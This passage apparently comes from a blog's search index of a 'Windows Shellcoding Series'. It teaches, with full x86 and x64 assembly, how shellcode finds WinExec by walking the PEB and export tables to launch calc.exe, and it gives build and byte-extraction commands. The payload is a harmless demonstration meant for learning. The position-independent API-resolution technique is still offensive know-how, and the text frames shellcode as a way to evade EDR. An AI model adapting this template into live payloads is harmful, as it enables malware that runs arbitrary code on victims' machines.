0x0c] ; Address of PEB_LDR_Module is loaded (in 32 bit it is at offset 0c)\rmov ebx, [ebx + 0x14] ; Address of InMemoryOrderModuleList is loaded this is pointing to kernelbase.dll\rmov ebx, [ebx] ; Pointing to ntdll\u0026#39;s ldr_data_table_entry\rmov ebx, [ebx] ; Pointing to kernel32.dll\u0026#39;s ldr_data_table_entry\rmov ebx, [ebx + 0x10] ; Base Address of kernel32.dll is now loaded\r;--------------Base address of kernel32dll is now loaded into ebx------------------\rpush ebp ; Storing prev stack base\rmov ebp, esp ; Setting up the base of new stack\rsub esp, 18h ; Setting up the new stack frame (to accomodate for the lack of registers in x64)\rxor esi, esi ; Clearing out esi manually\rpush esi ; To fix the alignment on the stack\rpush 00636578h ; \u0026#34;\\00cex\u0026#34; is being pushed onto the stack\rpush 456e6957h ; \u0026#34;EniW\u0026#34; is being pushed onto the stack\rmov [ebp-4], esp ; WinExec\\x00\rmov eax, [ebx + 3Ch] ; RVA of PE signature\radd eax, ebx ; Address of PE signature = base address + RVA of PE Signature\rmov eax, [eax + 78h] ; RVA of Export Table Directory\radd eax, ebx ; Address of Export Table Directory = base address + RVA of Export Table Directory\rmov [ebp-08h], eax ; Address of Export Table direcorty is being moved into ebp-0x8 for future purposes mov ecx, [eax + 24h] ; RVA of Ordinal Table\radd ecx, ebx ; Address of Ordinal Table = base address + RVA of Ordinal Table\rmov [ebp-0Ch], ecx ; Address of Ordinal Table is being moved into ebp-0xC\rmov edi, [eax + 20h] ; RVA of Name Pointer Table\radd edi, ebx ; Address of Name Pointer Table\rmov [ebp-10h], edi ; Address of Name Pointer Table is being moved into ebp-0x10\rmov edx, [eax + 1Ch] ; RVA of Export Address Table\radd edx, ebx ; Address of Export Address Table\rmov [ebp-14h], edx ; Address of Export Address Table is being moved into ebp-0x14\rmov edx, [eax + 14h] ; Number of exported functions is taken at the offset of 0x14 from eax, eax holds the Address of the Export Table Directory\rxor ecx, ecx ; ecx is cleared\rmov ecx, 0x7 ; ecx is loaded with the length of \u0026#34;WinExec\u0026#34;\rdynamic_api_resolve:\rmov edx, esp ; The last thing we pushed onto the stack was WinExec since which esp has not been changed, so it\u0026#39;s address is loaded into edx\rpush ecx\rxor eax, eax ; eax is cleared to be used as counter\rloop:\rmov ecx, [esp] ; Value at esp \u0026#34;WinExec\u0026#34; is loaded into ecx\rxor edi, edi ; edi is cleared\rmov edi, [ebp - 10h] ; Name pointer Table\u0026#39;s address is being moved into edi\rmov edi, [edi + eax * 4] ; Each entry inside the name pointer table (RVA of the symbol names) are being loaded one by one into edi\radd edi,ebx ; Actual Address of the symbol name = RVA of symbol name + base address\rmov esi,edx ; edx containing the address to string \u0026#34;WinExec\u0026#34; is moved into esi\rrepe cmpsb ; Used to compare strings stored in esi with strings stored in edi byte by byte je get_addr ; If it is equal we get the actual address of the function\rinc eax ; If not we increment the counte\rjmp loop ; Go back to loop in search for the next symbol name\rget_addr: xor ecx, ecx ; ecx is cleared\rmov ecx,[ebp-0Ch] ; Address of Ordinal Table is being loaded from ebp-0xC\rmov ax,[ecx + eax * 2] ; Same counter eax is taken and multiplied by 2 to account for words(as that is how ordinal table is maintained) and it\u0026#39;s added with address of Ordinal Table. This Ordinal Value is stored in ax\rxor ecx, ecx ; ecx is cleared\rmov ecx, [ebp - 14h] ; Address of Export Address Table is loaded into ecx\rmov eax, [ecx + eax * 4] ; And that is now being added with 4 * Ordinal value of the function to get the RVA address of the WinExec function into eax\radd eax, ebx ; Address of the WinExec API = RVA of WinExec + base address xor esi, esi ; esi is cleared\rpush esi ; being pushed onto stack for stakc alignment xor ecx, ecx ; clear ecx register\rpush ecx ; string terminator 0x00 for \u0026#34;calc.exe\u0026#34; string\rpush 0x6578652e ; exe. : 6578652e\rpush 0x636c6163 ; clac : 636c6163\rmov ebx, esp ; save pointer to \u0026#34;calc.exe\u0026#34; string in eax\rinc ecx ; SW_SHOWNORMAL = 0x00000001 is being set\rpush ecx ; tha is being pushed as the second argument\rpush ebx ; Calc.exe is being pushed as the first argument\rcall eax ; WinExec(\u0026#39;calc.exe\u0026#39;, 0x1) is called. Compiling 32 bit # Source # x86 Assembly to pop a calculator\nAssemble # To compile the shellcode and get the object file we can use any assembler, I prefer nasm:\nnasm -f win32 pop_calc_32.asm -o pop_calc_32.o Get Payload bytes # This is not necessary to just compile and run the shellcode. But, assuming we want to use this as payload, this is the one-liner used to generate the instruction bytes\nfor i in $(objdump -D pop_calc_32.o | grep \u0026#34;^ \u0026#34; | cut -f2); do echo -n \u0026#34;\\x$i\u0026#34; ; done Link # Before running this shellcode as such we would requrire linking, which can be done by\nld -m i386pe pop_calc_32.o -o pop_calc_32.exe To Run # pop_calc_32.exe Exit() # That brings us to the end of this blog post. To know more about where to look into how to load shellcode feel free to check out the loading payloads blog.\n","date":"27 March 2024","externalUrl":null,"permalink":"/posts/shellcoding_series/series1_pop_a_calc_part_3/","section":"Welcome to Posts!","summary":"Writing the Shellcode x86 W32 # 32 bit also goes through the same steps as 64 bits so I woudn\u0026rsquo;t be explaining it in detail rather, I have commented it on the side for you to understand and pick up based on context from x64","title":"Popping a calculator - 32 bit - Part 3/3","type":"posts"},{"content":" Writing the Shellcode x64 # This part of the blog covers the 64 bit shellcode to pop a calculator. Here I would be explaining my approach at writing source, you can skip right down to the bottom if you just want the compilation information here\nFor the source code you can visit the github repo\nGet The Kernel Base Address # This is the assembly that I ended up writing to get the kernel32 base\nxor rax, rax xor rcx, rcx mov rcx, gs:[rax + 0x60] ; Address of PEB is loaded mov rcx, [rcx+0x18] ; Address of PEB_LDR_Module is loaded mov rcx, [rcx+0x20] ; Address of InMemoryOrderModuleList is loaded this is pointing to kernelbase.dll mov rcx, [rcx+ 0x00] ; Pointing to ntdll\u0026#39;s ldr_data_table_entry mov rcx, [rcx + 0x00] ; kernel32.dll\u0026#39;s ldr_data_table_entry is now referenced mov rcx, [rcx+0x20] ; base Address of kernel32.dll is now loaded mov r10, rcx ; r10 and rcx have kernel32 base Now looking at this it might not be that comprehensible, so I\u0026rsquo;ll try my best to explain it in the simplest terms\nLine 1 \u0026amp; 2 - Are pretty obvious we are zero\u0026rsquo;ing out the rax and rcx registers\nLine 3 - We load the PEB base address using the offset from the gs register into rcx\nFor the people that are familiar with basic windows internals you might be familiar with the gs register. For the ones new to WinRev\nWhat is gs and fs?\nIn earlier days of computing, there was a need for segment registers like some of which you might have heard of like cs(code segment) es(extra segment),ss(stack segment) ,ds(data segment) etc.\nThese registers were born out of necessity to keep track of these segments and hold their addresses back when memory paging wasn\u0026rsquo;t introduced to manage memory.\nSo they used to keep these registers as base for segments and continue referencing memory at particular offsets from these registers to refer to various resources and code in appropriate sections.\nBut when memory paging came by the need for these registers were obsolete, and yet they are still present in Intel Architecture purely for backwards compatibility reasons and are still supported in different forms.\nWindows specifically uses a few segment registers like fs and gs to keep track of certain important structures related to a process like the PEB and TEB.\nYou can read up more on PEB and TEB on the internet But in simple words let\u0026rsquo;s look at some\nSome important Windows Data Structures (TIB/PEB/TEB) # TIB - Thread Information Block - was used for the non WindowsNT versions, to hold basic process information. Widnows still supports it for backwards compatibilty reasons.\nPEB - Process Environment Block - The Process Environment Block structure contains the process wide data structures which include global context, startup parameters, data structures for the program image loader, the program image base address, and synchronization objects\nTEB - Thread Environment Block - Is an extentsion of the TIB and hence TEB and TIB are used synonymously. The TEB is the structure for Windows NT, 2000, XP, Vista, 7, 8, 10 and 11.\nIn 32 bit, the fs register is used and this is used to point to the TIB of a given thread These are the structure offsets inside TIB at which we can find various other important structural fields\nFS:[0x00] : Current SEH Frame FS:[0x18] : TEB (Thread Environment Block) FS:[0x20] : PID FS:[0x24] : TID FS:[0x30] : PEB (Process Environment Block) FS:[0x34] : Last Error Value\nIn 64 bit, the gs regsiter is used in place of fs to keep track of the TIB structure\nGS:[0x30] : TEB GS:[0x40] : PID GS:[0x48] : TID GS:[0x60] : PEB\nNow using these registers and offset we can find our way into the PEB of any given windows binary.\nLine 4 - Now rcx which holds the base to PEB is added with 0x18 to get to the offset of PEB_LDR_DATA\nAbout PEB and PEB_LDR_DATA structure\nPEB Structure\nAs mentioned easlier, the PEB structure contains various information about a particular process like the base address, if it is being debugged or not, any inherited flags from other parent processes etc.\nSource\nBut the one we are most interested in is the PEB_LDR_DATA.\nThe PEB_LDR_DATA structure is the defining record of which user-mode modules are loaded in a process. Each process has one PEB_LDR_DATA structure associated with it. Its address is kept in the Ldr member of the process’s PEB. PEB_LDR_STRUCTURE\ntypedef struct _PEB_LDR_DATA { ULONG Length; UCHAR Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; } PEB_LDR_DATA, *PPEB_LDR_DATA; As you can see it contains pointers to three important linked lists\nNamely,\nInLoadOrderModuleList InMemoryOrderModuleList InInitializationOrderModuleList They hold information about the modules (dlls) that are loaded by a proces\nThese are linked lists which share the same elements but they are just linked in a different order as suggested by their names\nTo explain them in brief I shall site it from a book -\nSource - The art of memory forensics book\nInLoadOrderModuleList - This linked list organizes modules in the order in which they are loaded into a process. Because the process executable is alwyas first to load in the process address space, its entry is first in this list.\nInMemoryOrderModuleList - This linked list organizes modules in the order in which they appear in the process\u0026rsquo;s virtual memory layout. The last DLL to load may end up first in memory due to ASLR and other factors\nInIntializationOrderModuleList - This linked list organizes the modules in the order in which their DLL Main was executed. Just because a dll in loaded doesn\u0026rsquo;t mean the DllMain is always called. For example, when we load a dll as a data file or as a resource.\nLine 5 - Now The address to the First Link of the linked list of InMemoryOrderModuleList is loaded.\nThe offset is at 0x20 for 64 bit\nThe first link is pointing to an entry about Kernelbase.dll, so at the offset 0x20 we have LDR_TABLE_ENTRY structure Why InMemoryOrderModuleList?\nWell, In all windows versions, the second and third DLLs in the linked list of InMemoryOrderModuleList is always ntdll.dll and kernel32.dll.\nWe can also accomplish this using InLoadOrderModuleList however, the order of DLLs were changed from Vista onwards, so this doesn\u0026rsquo;t ensure portability of shellcode.\nHence we stick with InMemoryOrderModuleList\nNow after executing line 5 rcx points to the LDR_DATA_TABLE_ENTRY of kernelbase.dll\nLine 6 - Now we load the address of the second entry into the rcx , which now holds the base to ntdll (as the first entry was already kernelbase.dll and it was pointed to by)\nLDR_TABLE_DATA_STRUCTURE\nThe way it works is as depicted below\nSource\nBecause we started accessing from the InMemoryOrderModuleList it keeps pointing to the next InMemoryOrderModuleList entry in the LDR_DATA_TABLE_ENTRY structure. Hence we are able to retrieve ntdll\u0026rsquo;s LDR_DATA_TABLE_ENTRY structure by just calling offset 0\nLINE 7 - Similar to line 6 we now load the next dll (ie) the third dll in memory order.\nLINE 8 - Now we load the base of kernel32.dll at offset 0x20\nNow you may wonder, why is it at 0x20 and not 0x30 as shown in the LDR_DATA_TABLE_ENTRY structure above\nThat because of the very reason mentioned earlier, even though we got to the kernel32.dll\u0026rsquo;s LDR_DATA_TABLE_ENTRY by calling offset-0x00 , we used a pointer to the LIST_ENTRY InMemoryOrderLinks and not to the start of the structure.\nNow to acess the DLL Base we need to find the relative offset from The InMemoryOrderLinks entry. Which ends up being 0x30 - 0x10 = 0x20\nSo now rcx and r10 holds the base address of the kernel32.dll\nLine 9 - It just copies the value inside rcx into r10 for future uses\nGet the address to the Export table # mov ecx, [rcx + 0x3c] ; Find RVA to PE header add rcx, r10 ; Points to the PE header ;mov rcx, [rcx + 0x78] ; RVA of Export table directory mov ecx, [rcx + 0x88] ; RVA of Export table directory add rcx, r10 ; Export table directory address loaded xor r9, r9 mov r9d, [rcx + 0x1c] ; RVA Export Address Table add r9, r10 ; Address to export Address Table xor r11, r11 mov r11d, [rcx + 0x20] ; RVA Export Name pointer table address add r11, r10 ; Adrdess of Export Name pointer table xor r12, r12 mov r12d, [rcx + 0x24] ; RVA of Ordinal Table add r12, r10 ; Address of Ordinal Table Here Initially rcx and r10 hold the base of the kernel32 dll\nLine 1 - Here we find the RVA (Relative virtual address from the base of Kernel32), to the the PE Header The offset of 0x3c is never changed and remains the same in the PE format, as it is used to get to the PE header.\nEnough being side tracked, but as you can see in the image, the letter PE show up at the RVA 0xE8 and the offset/the RVA of this can always be found at 0x3C from the base.\nLine 2 - Now we just add this offset (in our case E8) to the base of kernel32 dll to get the pointer to the PE header\nLine 3 \u0026amp; 4 - You may notice that line 3 is commented out and it has been given the same comment as RVA of Export Table Directory as similar to line 4. Now I don\u0026rsquo;t know the reason why, but in our case when I used tools such as PE VIEW and CFF Explorer both the tools showed the offset to find the RVA(Relative virtual address from the base of the dll) for Export Table Directory as 0x88 from the PE header.\nBut, in the countless blogs that I did refer to and did take notes from as I was researching on shellcode and how it works, and many other windows related blogs all of them mention the RVA to be found at the offset 0x78 and not at 0x88.\nSo if someone kind enough to know the reason behind this is out there, feel free contact me and help me understand this 😭😭 and I\u0026rsquo;ll edit this blog and put out the explanation as well.\nBut yes, that being said, the RVA for kernel32.dll\u0026rsquo;s in this particular case is at the offset 0x88 from the PE header, so rn we load that and move it into ecx and add it with r10 the kernel32.dll\u0026rsquo;s base address.\nLine 5 - Next we need to find the Export Table Address. Now you may wonder why is there a need for Export Table Directory and Export Table as two separate things. Why couldn\u0026rsquo;t we just have the Export Table as a single entity so that we could just take the address refering to the name directly.\nWell, the way windows has organized is not just a simple Export Table rather, it\u0026rsquo;s a well defined structure that has general information with regards to exports furthermore it has three important table pointers pertaining to the sole purpose of keeping track of what all functions and modules are being exported out of a binary.\nsource: Export Address Table (EAT)\nExport Address Table pointer It contains the RVA to the list of exported functions. And an associated ord value. The ord value can be used to find the RVA of the exported function Name Pointer Table It contains the names of the exported functions and associated address of this name string in memory. This table can be parsed to find the address to a particular function\u0026rsquo;s address Ordinal Table It contains the address of the various symbols and an associated ordinal value So, these 3 tables are interconnected and are needed for a succesful retreival of an exported function\u0026rsquo;s address.\nLine 6, 7 and 8 - Now we get the register r9 that is going to hold the address of the Export Address Table ready. And the RVA(Relative Virtual Address from the base of the kernel32.dll) to the export address table at an offset of 0x1c from the address of Export table directory.This RVA is always a dword hence we stored it under r9d. And finally we add this RVA to the base of kernel32.dll to get the address to Export Address Table.\nLine 9, 10 and 11 - Now we get the register r11 that is going to hold the address of the ready. And the RVA(Relative Virtual Address from the base of the kernel32.dll) to the Name Pointer Table at an offset of 0x20 from the address of Export table directory. This RVA is always a dword hence we stored it under r11d.And finally we add this RVA to the base of kernel32.dll to get the address to Name pointer table.\nLine 12, 13 and 14 - Now we get the register r12 that is going to hold the address of the ready. And the RVA(Relative Virtual Address from the base of the kernel32.dll) to the Ordinal Table at an offset of 0x24 from the address of Export table directory. This RVA is always a dword hence we stored it under r12d.And finally we add this RVA to the base of kernel32.dll to get the address to Ordinal Table.\nSummary of registers so far:\nr10 - Holds kernel32.dll\u0026rsquo;s base r9 - Holds the Export Address Table pointer r11 - Holds Name Pointer Table Address r12 - Holds Ordinal Table Address\nFind the Base address of the WinExec function # xor rcx, rcx ; rcx is cleared mov rcx, 0x7 ; Length of WinExec is loaded into rcx mov rax, 0x00636578456e6957 ; \u0026#34;\\00cexEniW\u0026#34; is loaded into rax push rax ; The string name is pushed onto the stack push rcx ; Length is pushed onto the stack call dynamic_api_resolve ; dynamic_api_resolve label is called mov r14, rax ; return address of the WinExec is put into r14 jmp next ; we jump to the next label dynamic_api_resolve: pop rbx ; return address is stored in rbx pop rcx ; Length of the api is stored into rcx xor rax, rax ; rax is cleared mov rdx, rsp ; Move the address of name of the api into rdx push rcx ; Length of the api is pushed onto the stack loop: mov rcx, [rsp] ; The counter is being refreshed each time xor rdi, rdi ; clear rdi for getting the name mov edi, [r11 + rax * 4] ; RVA of function name symbol = Address of Name Pointer Table + counter * 4 add rdi, r10 ; Address of Function name symbol = RVA of function name symbol + base address mov rsi, rdx ; moving string to be compared into rsi repe cmpsb ; comparing strings in rdi and rsi je get_addr ; If equal we jump to get the address inc rax ; Else increment counter jmp loop ; jump back into loop get_addr: pop rcx ; Remove string length from top of stack mov ax, [r12 + rax * 2] ; Ordinal number of kernel 32 API (WinExec) = Adress of ordinal table + Counter * 2 mov eax, [r9 + rax * 4] ; RVA of API = Address of Export Address Table + Ordinal number of WinExec * 4 add rax, r10 ; Address of the API = RVA of API + base address push rbx ; Pushing the Return Address back onto the stack ret Line 1 \u0026amp; 2 - We start off with clearing out rcx register and set it to be 0x7 which is len(\u0026quot;WinExec\u0026quot;)\nLine 3 - It\u0026rsquo;s \u0026quot;WinExec\\00\u0026quot; in little endian moved into rax\nLine 5, 6 \u0026amp; 7 - Now we push the \u0026quot;WinExec\\00\u0026quot; first followed by the length and call our dynamic_api_resolve label\nContinuing with the control flow,\nLine 11 - We initially store the return address at the top of the stack and store it in rbx.\nLine 12 - 15 - Next value on top of the stack is the length that we pushed. That is being stored back in rcx, then rax is cleared. Now that the length is popped, the value at rsp (ie the top of the stack) is now the string of 'WinExec'. The address of rsp is put into rdx, and rcx is pushed back onto the stack.\nLine 17: Defines the start of a label which is used to loop\nLine 19 - 23 : We move the counter into rcx. Clear rdi for future purposes.Now remember, r11 holds the Address of the Name Pointer Table.\nSo, we add Address of Name pointer table + a counter (this we are mainting to keep track of which index of the Name pointer table is the symbol of our WinExec function at)\nAnd this counter is multiplied by 4 because all the RVA values inside this function is stored in dword format.\nSo, right now we load the RVA of the string into edi, and adding the kernel32 base to get the address of the actual string. We keep this arbitrary string in rdi.\nrdx had our \u0026quot;WinExec\u0026quot; whose address is now being moved into rsi\nLine 25 - 28 - repe cmpsb is executed. Now this is a instruction which compares the string values inside rdi and rsi and sets the zero flag accordingly. It compares it byte by byte, but it\u0026rsquo;s all masked under the single instruction of repe cmpsb.\nNow if the strings are equal then we go ahead and jump to get_addr. Which we\u0026rsquo;ll get to in a bit. But if it is not equal then we increment the counter value by 1, to go to the next RVA of the next string. And we jump back to loop ie (line 17)\nLine 31 - 33 - label get_addr is defined. Now as we know, the top of the stack contains the length of the string \u0026quot;WinExec\u0026quot;. We pop this from the top of the stack back into rcx.\nNow we need to find the ordinal number of the particular WinExec. And ordinal number is simply put an index that windows maintains for each and every export.\nThink of it as a process ID but for exported functions. Each exported function has a unique ID which windows uses to reference the respective functions. And this ordinal number is stored as a WORD. Like so,\nThe names might look too confusing, but as of now just focus on Name RVA and it\u0026rsquo;s type as shown below in the image, Name Ordinal and it\u0026rsquo;s type and Function RVA and it\u0026rsquo;s type in the image\nSo the ordinal numbers are arranged in order as you can see, and a corresponding ordinal number can be found out using the corresponding counter variable.\nBecause we kept track of rax, the index of the RVA of the function, now we can find the ordinal numebr using the same rax counter.\nAll we have to do is just take this counter/index and multiply it by 2 because of WORD and then add it to the base address of the orindal table.\nNow derefencing this calculated pointer would get us the ordinal number of the appropriate name string. Because ordinal numbers are stored as words, we stored it back in ax\nLine 35 - 38 - Now we take this ordinal number and multiply it by 4 (Function RVA is stored as DWORD) and add this to the base of the Export Address Table to get the function RVA of our desired function which is \u0026quot;WinExec\u0026quot;\nWe now take this RVA and add it with r10(the kernel32.dll\u0026rsquo;s) base address to finally get the address of the desired API and store it under the rax register. (The return value of any call function is stored under rax). Now we push the rbx(the register that held on to the return address) and execute ret.\nExecuting ret would take us back to\nLine 7 \u0026amp; 8 - Now address of the WinExec function inside rax is moved into the r14 register and we now jump to a label called next\nLoad the arguments into the WinExec function # ;------------------------now r14 has our API ----------------------------------- next: xor rcx, rcx ; clears out rcx mul rcx ; rax, rdx and rcx are 0 push rax ; Null Terminate string on stack mov rax, 0x6578652e636c6163 ; Moving \u0026#34;exe.clac\u0026#34; into rax push rax mov rcx, rsp ; into first argument inc rdx ; Argument to winEXe show_Normal For this part we shall refer to the msdn documention on WinExec\nAnd as we,\nWe need to give\nthe cmdline string of the program that we want to run The cmdshow argument (this is basically controls how to open the program in what typ eof window) We shall still with just the most basic show_window_normal which holds the value 1 as it can be seen here. Line 1 - 3 - We now reach the next label. rcx is cleared and we use mul rcx to also clear rax, rdx as well\nLine 5 - 7 - Now that rax is 0, we just push it onto the stack to act as a null terminator for the upcoming string that we are about to push.\nThen we mov 0x6578652e636c6163 which is calc.exe in little endian. Now we push it onto the stack as well\nThen we load the first argument into rcx, which is at the top of the stack. The windows calling convention goes like rcx, rdx, r8, r9 .\nNow we increment that value of rdx by 1, setting 1 as the second argument.\nCall the function # sub rsp, 0x20 call r14 Here we do sub rsp, 0x20. Because I learnt WinExec clobbers the first 32 bytes on the stack as it is a function that is only to be in use for 16 bit mode and any system running in either 32 or 64 bit mode should use CreateProcess as mentioned in the above image. So this extra space that we create acts as a safety net to prevent it from clobbering our useful bytes.\nNow we go ahead and call r14 which holds the address of WinExec.\nThat brings us to the end of our x64 shellcode.\nCompiling 64 bit # Source Code # The full source and the associated files for this can be found here on my github - x64 Assembly to pop a calculator\nAssemble # To compile the shellcode and get the object file we can use any assembler, I prefer nasm:\nnasm -f win64 pop_calc.asm -o pop_calc.o Get Payload bytes # This is not necessary to just compile and run the shellcode. But, assuming we want to use this as payload, this is the one-liner used to generate the instruction bytes\nfor i in $(objdump -D pop_calc.o | grep \u0026#34;^ \u0026#34; | cut -f2); do echo -n \u0026#34;\\x$i\u0026#34; ; done Link # Before running this shellcode as such we would requrire linking, which can be done by\nld -m i386pep pop_calc.o -o pop_calc.exe To Run # pop_calc.exe ","date":"27 March 2024","externalUrl":null,"permalink":"/posts/shellcoding_series/series1_pop_a_calc_part_2/","section":"Welcome to Posts!","summary":"Writing the Shellcode x64 # This part of the blog covers the 64 bit shellcode to pop a calculator.","title":"Popping a calculator - 64 bit - Part 2/3","type":"posts"},{"content":" Windows Shellcoding Series 1 - Part 1/3 # Popping a calculator # Init() # Now in the series I would be covering both the 64 bit and 32 bit versions of the shellcode to pop a calculator and would go about explaining them both separately.\nThe Approach # The basic idea of approach or the methodology in which I intend to approach writing this shellcode is the same for both 64 bit and 32 bit.\nNow let\u0026rsquo;s start by thinking backwards from the result as to figure out what we need in the shellcode to launch the calculator.\n- Execute a calculator # The end goal of our current shellcode is that it needs to end in launching a calculator For the exact purpose of executing/launching applications windows has the WinExec API which does exactly what we need\nsource : MSDN WinExec Documentation\nSo all we need to do is call WinExec with it\u0026rsquo;s required parameters and we\u0026rsquo;re done. We could have also done it using CreateProcessA but that involves a lot more arguments and I wanted to use the most simplest approach to this shellcode But, now this gets us thinking how do we go about calling WinExec?🤔\n- How to call WinExec? # If we are normally programming we can just do a WinExec() with the necessary arguments\nHowever, internally in assembly we do a call register where the register holds the addresss of the function that we are about to call\nSo in a nutshell, To call any function we need an address An address to where this function is defined and loaded in memory\nSo first we need to figure out where this WinExec Function is defined inside the system.\nNow upon basic googling we find kernel32.dll to contain the function definition of WinExec .\nSo now we need to go about finding where exactly inside kernel32 is this function Winexec defined\n- Finding WinExec inside kernel32 # So now to get down to a few Windows Reversing basics, All windows executables need to follow the PE format which defines how a particular executable is to organize it\u0026rsquo;s various data, like code, images, functions that it imports from other executables or libaries so on and so forth.\nSo, any windows executable (PE format) contains a lot of sections out of which two important ones are the Export Table and Import table\nThese two tables store the information relating to the modules that are being imported by the binary and exported from the binary\nIn our case we need to look for WinExec inside kernel32.dll under the Export Directory, because whatever is being exported out of a dll is stored under the Export Directory.\nThis Export directory would contain information like the name of the corresponding function (WinExec in our case) and the offset where we can find it\nSo summarising what we need to do now is\nto find the base address to the kernel32.dll function then from there we can get to the Export Address Directory inside kernel32.dll then next we can get to the base address of the function WinExec - Getting base of kernel32.dll # Windows creates/launches a thread to run any code, even the arbitrary bytes such as this shellcode. And while doing so, it also associates a very important data structure to each thread that it runs and controls called the TEB - The Thread Environment Block. This structure holds important information pertaining to a thread and the libraries/dlls it loads. This TEB also points to another important strcuture associated to any such process and thread called the PEB - Process Environment Block which is maintained at a constant offset from the TEB. Using this PEB now we can find the base address of the kernel32.dll\nNow this might be a bit confusing to the new ones here, the questions probably running through your mind is,\nSure, there\u0026rsquo;s a TEB associated to every running thread and running a thread is how windows runs the shellcode. But what I don\u0026rsquo;t get is,\nWhy is this associated to kernel32.dll which has nothing to do with the shellcode as of yet? Why is it already associated with our shellcode without us even having to load this particular library/dll? Why is it already associated without even having to call any function from it previously? Well to answer that, let\u0026rsquo;s take a step back and look at three important dlls in Windows that are crucial to the functioning of the Operating system by itself\nntdll.dll kernel32.dll KERNELBASE.dll These dlls contain a lot of functions that are crucial to the very basic functioning of the Operating system itself and is constantly being accessed by multiple user processes and even windows internal processes to keep the operating system functioning and alive. Windows\u0026rsquo;s own processes make use of various functions from these dlls to even start up the OS by itself. For example, The base services (like working with file systems, processes, devices, etc.) are provided by kernel32.dll.\nSo I hope the importance of these dlls in the Windows operating system established now.\nAnd because these dll\u0026rsquo;s are commonly used and loaded, it would make a lot more sense to just load them into the memory once at system start and then pass handles (or) pointers as reference to other processes which require functions from these dlls.\nWhich is exactly what happens and why it is already associated in a process\u0026rsquo;s TEB-\u0026gt;PEB by default.\nAnd because these dlls are very important they are by default imported by each and every thread/process because it is required to even start up the thread in the first place. Especially ntdll.dll and kernel32.dll\nTo summarise, we can find the kernel32.dll\u0026rsquo;s base through the TEB associated with our shellcode thread because it is already imported when the OS runs the shellcode.\nSo now we know where we can find these dll\u0026rsquo;s being loaded and under what data structure can we find them. The how is explained in this series.\n- Compiling and running the shellcode # Loading the shellcode can be done by the help of a simple dropper program which carries our payload (shellcode) and runs it on the fly. This method is covered in my other blog post which you can find here\nSo now that we have the approach down This is the final skeletal steps of our approach to write our shellcode\n1) Get the kernel base address\r2) Get the address to the Export table\r3) Find the Base address of the WinExec function\r4) Load the arguments into the WinExec function\r5) Call the function\r6) Compiling the shellcode These 6 steps are going to be out outline for the writing the shellcode\nWe\u0026rsquo;ll look into 64 bit shellcode in the next Part of this blog post.\n","date":"27 March 2024","externalUrl":null,"permalink":"/posts/shellcoding_series/series1_pop_a_calc_part_1/","section":"Welcome to Posts!","summary":"Windows Shellcoding Series 1 - Part 1/3 # Popping a calculator # Init() # Now in the series I would be covering both the 64 bit and 32 bit versions of the shellcode to pop a calculator and would go about explaining them both separately.","title":"Popping a calculator - Basic - Part 1/3","type":"posts"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/series/","section":"Tags","summary":"","title":"Series","type":"tags"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/shellcode/","section":"Tags","summary":"","title":"Shellcode","type":"tags"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/series/shellcoding/","section":"Series","summary":"","title":"Shellcoding","type":"series"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/posts/shellcoding_series/","section":"Welcome to Posts!","summary":"Learn more about me and why I am starting this blog.","title":"Shellcoding series","type":"posts"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":" Windows Shellcoding Series 0 # Init() # Welcome to the prequel blogpost of my Shellcoding Series With this I intend to start of a series of Shellcoding based blogposts aiming to develop and post interesting shellcodes\nThe pre-requisite to follow this series of blog posts:\nA laptop ofc Bad social life (Why else would you be on here?) An omnitirix (Everyone has one these days) The Hardcover Windows internals book by Pavel Yosifovich 7th edition (to place your laptop on for good ergonomics) The Why? # I have always been fascinated by shellcode (especially in windows) and the intricacies it holds.\nStriving to create a nulbyte free shellcode, limiting the shellcode to under a certain size are some of the intricacies that we\u0026rsquo;ll get into as well\nThe idea of being able to use a set of bytes as a payload to inject into memory and to execute it has always seemed fun to me.\nSo I thought the best way to learn shellcoding is to make a blog series out of it as I experiment my way through shellcode and windows internals . And I hope to learn a lot out of this journey while being able to share to the community as well.\nWell, without further ado, let\u0026rsquo;s jump right into the topic!\nWhat is Shellcode? # Simply put, a piece of shellcode is a set of bytes(of assembly instructions) that can be loaded in memory and executed like any other piece of assembly code.\nA shellcode is a versatile piece of code that allows us to dynamically load a block of assembly instructions and execute it on the fly thereby enhancing the capabilities of a binary. It is particularly useful for malicious purposes, when combined with an encrypter or a packer it can go undetected under various EDRs and other AV scanners and checkers.\nFor example\nchar shellcode[] = \u0026#34;\\x90\\x90\\xcc\\xc3\u0026#34; \\x90 is for NOP \\xcc is for INT3 \\xc3 is for RET\nThis payload/shellode translates to\nNOP NOP INT3 RET And this shellcode can be loaded into memory and executed like any other section of assembly code\nWe\u0026rsquo;ll be covering the loading of shellcode in the other blogposts of mine\nWhat does it accomplish? # Now clearly the above shown shellcode doesn\u0026rsquo;t accomplish much\nThere\u0026rsquo;s much more powerful and useful shellcode harboring malicious intent such as connecting to a c2 server and downloading the actual malicious file, dll injection, processs injection and many more.\nThere\u0026rsquo;s a pretty neat interface to get working shellcode for this purpose on windows\nMsfVenom # MsfVenom is a shellcode generator that has templates based upon which we can customize our own payload\nNow this series doesn\u0026rsquo;t cover shellcode generation by MsfVenom, Metasploit has a pretty neat documentation for that. Feel free to check that out.\nAbout this series # Now this series aims to showcase various shellcode/payload for various purposes on windows and aims to completely write it from scratch and in the process also learn a lot about Windows Internals, it\u0026rsquo;s structures, APIs and techniques\nThis series would mostly look like a walkthrough rather than a research blog, because it is being written as I am exploring around in windows internals and red teaming as well.\nExit() # With all that being said, now let\u0026rsquo;s get down to business and let\u0026rsquo;s write some basic windows shellcode begining with the next blog post.\n","date":"27 March 2024","externalUrl":null,"permalink":"/posts/shellcoding_series/series0_basic/","section":"Welcome to Posts!","summary":"Windows Shellcoding Series 0 # Init() # Welcome to the prequel blogpost of my Shellcoding Series With this I intend to start of a series of Shellcoding based blogposts aiming to develop and post interesting shellcodes","title":"Windows Shellcoding Series 0","type":"posts"},{"content":"","date":"19 March 